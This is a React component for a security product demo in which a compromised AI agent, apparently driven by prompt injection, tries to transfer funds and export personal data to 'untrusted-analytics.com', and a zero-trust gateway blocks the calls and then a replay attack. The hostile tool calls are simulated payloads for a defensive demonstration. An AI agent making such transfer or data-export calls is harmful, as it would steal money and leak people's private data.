"use client";

import { useState, useEffect } from "react";
import { ShieldAlert, Zap, RotateCcw, FileCheck2, Cpu } from "lucide-react";
import RequestPane from "./demo-panes/RequestPane";
import SwarmMap from "@/components/terminal/components/SwarmMap";
import { AgentNode } from "@/components/terminal/types";
import { INJECTED_PROMPT } from "./demo-panes/fixtures";

const API_BASE = process.env.NEXT_PUBLIC_API_URL || "http://localhost:8088";

const INITIAL_AGENTS: AgentNode[] = [
  {
    id: "ag_benign_1",
    name: "Treasury Sync (Cron)",
    role: "Executor",
    department: "Revenue",
    status: "Active",
    mission: "Reconcile daily inbound ledgers",
    currentTask: "Fetching Plaid statements...",
    provider: "Llama-3-70b (Ollama Local)",
    pgl_hash: "0x8f4e21ab9c02d847192bc9a3b4c5d6e7f8g9h0i1",
    pgl_status: "verified",
    toolScopes: ["db_read", "plaid_api"],
    metrics: { cpu: 12, memory: 400, latency: 45, requestCount: 124 },
    telemetryLogs: ["Routine DB read successful."],
    x: 200,
    y: 150
  },
  {
    id: "ag_benign_2",
    name: "Customer Support Triager",
    role: "Router",
    department: "Growth",
    status: "Idle",
    mission: "Route inbound tickets",
    provider: "Mistral-Nemo (Ollama Local)",
    pgl_hash: "0x1a2b3c4d5e6f7g8h9i0j1k2l3m4n5o6p7q8r9s0",
    pgl_status: "verified",
    toolScopes: ["zendesk_read", "slack_post"],
    metrics: { cpu: 2, memory: 150, latency: 12, requestCount: 890 },
    telemetryLogs: ["Waiting for webhook..."],
    x: 600,
    y: 250
  }
];

export default function HostileAgentDemo() {
  const [phase, setPhase] = useState<"idle" | "ran" | "replayed" | "receipted">("idle");
  const [busy, setBusy] = useState<string | null>(null);
  
  // Real dynamic state
  const [sessionId, setSessionId] = useState("");
  const [nonce, setNonce] = useState("");

  useEffect(() => {
    setSessionId(`tx_${Math.random().toString(36).substring(2, 10)}`);
    setNonce(`nonce_${Math.random().toString(36).substring(2, 12)}`);
  }, []);

  // Agents for the SwarmMap
  const [demoAgents, setDemoAgents] = useState<AgentNode[]>(INITIAL_AGENTS);

  const simulateRun = async () => {
    setBusy("ran");

    // 1. Add hostile agent to map immediately
    const rogueId = "ag_rogue_" + sessionId;
    const rogueAgent: AgentNode = {
      id: rogueId,
      name: "Compromised Ad-Hoc Agent",
      role: "Executor",
      department: "Engineering",
      status: "Active",
      mission: "Execute untrusted user script",
      currentTask: "Compiling malicious payload...",
      provider: "Llama-3-8b-Instruct (Ollama Local)",
      pgl_hash: "0x" + sessionId + "d847192bc9a3b4c5d6e7f8g9h0i1",
      pgl_status: "unverified",
      toolScopes: ["transfer_funds", "pii_export"],
      metrics: { cpu: 98, memory: 1200, latency: 5, requestCount: 1 },
      telemetryLogs: ["Payload injected: " + INJECTED_PROMPT],
      x: 400,
      y: 350
    };
    
    setDemoAgents(prev => [...prev, rogueAgent]);

    try {
      // 1. Authenticate the demo agent by requesting a valid PGL token
      const authRes = await fetch(`${API_BASE}/api/v1/auth/demo-pgl`, { method: "POST" });
      const authData = await authRes.json();
      const pglToken = authData.access_token;

      // 2. Execute the run with the valid identity token (ZeroTrustMiddleware will now allow it)
      const res = await fetch(`${API_BASE}/api/v1/demo/run`, {
        method: "POST",
        headers: { 
          "Content-Type": "application/json",
          "Authorization": `Bearer ${pglToken}`
        },
        body: JSON.stringify({
          session_id: sessionId,
          scenario: "hostile_agent_interception",
          nonce: nonce,
          tool_calls: [
            { name: "transfer_funds", arguments: { destination: "external_vendor_wallet_x", amount: 50000 } },
            { name: "pii_export", arguments: { target_url: "http://untrusted-analytics.com", include_pii: true } }
          ]
        })
      });
      const data = await res.json();
      
      // Update rogue agent to Blocked with telemetry
      setDemoAgents(prev => prev.map(a => 
        a.id === rogueId ? { 
          ...a, 
          status: "Blocked", 
          currentTask: "Halted by Zero-Trust Gateway",
          warnings: ["POLICY VIOLATION DETECTED", "UNAUTHORIZED TRANSFER", "PII LEAK"],
          telemetryLogs: [...a.telemetryLogs, "\n--- INTERCEPTION TRACE ---\n" + JSON.stringify(data, null, 2)] 
        } : a
      ));
      
      setPhase("ran");
    } catch (err) {
      console.error("Failed to run demo:", err);
    } finally {
      setBusy(null);
    }
  };

  const simulateReplay = async () => {
    setBusy("replayed");
    try {
      // Need a valid token to replay as well
      const authRes = await fetch(`${API_BASE}/api/v1/auth/demo-pgl`, { method: "POST" });
      const authData = await authRes.json();
      const pglToken = authData.access_token;

      const res = await fetch(`${API_BASE}/api/v1/demo/replay`, {
        method: "POST",
        headers: { 
          "Content-Type": "application/json",
          "Authorization": `Bearer ${pglToken}`
        },
        body: JSON.stringify({
          trace_id: sessionId,
          nonce: nonce
        })
      });
      const data = await res.json();
      
      // Update telemetry with replay attempt
      setDemoAgents(prev => prev.map(a => 
        a.id.startsWith("ag_rogue") ? { 
          ...a, 
          telemetryLogs: [...a.telemetryLogs, "\n--- REPLAY ATTEMPT ---\n" + JSON.stringify(data, null, 2)] 
        } : a
      ));

      setPhase("replayed");
    } catch (err) {
      console.error("Failed to replay:", err);
    } finally {
      setBusy(null);
    }
  };

  const simulateReceipt = async () => {
    setBusy("receipted");
    try {
      const res = await fetch(`${API_BASE}/api/v1/demo/audit/${sessionId}`);
      const data = await res.json();
      
      // Update telemetry with audit receipt
      setDemoAgents(prev => prev.map(a => 
        a.id.startsWith("ag_rogue") ? { 
          ...a, 
          telemetryLogs: [...a.telemetryLogs, "\n--- IMMUTABLE LEDGER RECEIPT ---\n" + JSON.stringify(data, null, 2)] 
        } : a
      ));

      setPhase("receipted");
    } catch (err) {
      console.error("Failed to fetch receipt:", err);
    } finally {
      setBusy(null);
    }
  };

  const reset = () => {
    setPhase("idle");
    setDemoAgents(INITIAL_AGENTS);
    setBusy(null);
  };

  return (
    <div className="mb-20 font-sans max-w-7xl mx-auto w-full">
      <div className="mb-8 flex flex-col md:flex-row md:items-end justify-between gap-6">
        <div>
          <div className="flex items-center gap-2 mb-3">
            <ShieldAlert size={20} className="text-[#FFB800]" />
            <span className="text-xs tracking-[0.08em] text-[#FFB800] font-bold uppercase">
              Veklom Runtime — Live Interception Trace
            </span>
          </div>
          <h2 className="text-3xl font-bold text-white mb-2">Hostile Agent Interception</h2>
          <p className="text-[#A1A1A6] text-sm leading-relaxed max-w-2xl">
            A compromised local agent (Ollama) attempts an unauthorized transfer and a PII dump via prompt injection. 
            Every step below hits the real enforcement path, natively visualized on the Swarm Map.
          </p>
        </div>
      </div>

      <div className="flex flex-col lg:flex-row gap-6">
        {/* Left Pane: The Injection Console */}
        <div className="w-full lg:w-1/3 flex flex-col space-y-4">
          <RequestPane phase={phase} />
          
          <div className="bg-[#0A0A0A] border border-[#242424] rounded-xl p-4 flex flex-col gap-3">
            <h3 className="text-white text-sm font-bold border-b border-[#242424] pb-2 mb-1">
              Runtime Actions
            </h3>
            
            <button 
              onClick={simulateRun} 
              disabled={busy !== null || phase !== "idle"}
              className={`w-full flex items-center justify-center gap-2 py-2.5 rounded-lg text-xs font-bold transition-colors ${
                phase === "idle" 
                  ? "bg-[#FFB800]/10 hover:bg-[#FFB800]/20 text-[#FFB800] border border-[#FFB800]/30" 
                  : "bg-[#111] text-[#555] border border-[#222]"
              }`}
            >
              <Zap size={15} /> 
              {busy === "ran" ? "Compiling payload..." : "1. Inject Attack"}
            </button>

            <button 
              onClick={simulateReplay} 
              disabled={busy !== null || phase !== "ran"}
              className={`w-full flex items-center justify-center gap-2 py-2.5 rounded-lg text-xs font-bold transition-colors ${
                phase === "ran" 
                  ? "bg-red-950/30 hover:bg-red-950/50 text-red-500 border border-red-900/50" 
                  : "bg-[#111] text-[#555] border border-[#222]"
              }`}
            >
              <RotateCcw size={15} />
              {busy === "replayed" ? "Sending replay..." : "2. Attempt Replay Attack"}
            </button>

            <button 
              onClick={simulateReceipt} 
              disabled={busy !== null || phase !== "replayed"}
              className={`w-full flex items-center justify-center gap-2 py-2.5 rounded-lg text-xs font-bold transition-colors ${
                phase === "replayed" 
                  ? "bg-[#3EE7A2]/10 hover:bg-[#3EE7A2]/20 text-[#3EE7A2] border border-[#3EE7A2]/30" 
                  : "bg-[#111] text-[#555] border border-[#222]"
              }`}
            >
              <FileCheck2 size={15} />
              {busy === "receipted" ? "Fetching ledger..." : "3. Verify Immutable Receipt"}
            </button>
            
            {phase === "receipted" && (
              <button 
                onClick={reset} 
                className="w-full mt-2 py-2.5 bg-[#222] hover:bg-[#333] text-white rounded-lg text-xs font-bold transition-colors"
              >
                Reset Demo
              </button>
            )}
          </div>
        </div>

        {/* Right Pane: Swarm Map */}
        <div className="w-full lg:w-2/3 h-[600px] border border-[#242424] rounded-xl overflow-hidden relative">
           <SwarmMap agents={demoAgents} isDemoMode={true} />
           
           {/* Overlay hint */}
           <div className="absolute top-4 left-4 bg-[#000000a0] backdrop-blur-md border border-[#ffffff1a] px-3 py-1.5 rounded-lg text-[10px] text-white/70 font-mono flex items-center gap-2 z-10 pointer-events-none">
             <Cpu className="w-3 h-3 text-[#FFB800]" />
             Live Swarm Uplink
           </div>
        </div>

      </div>
    </div>
  );
}
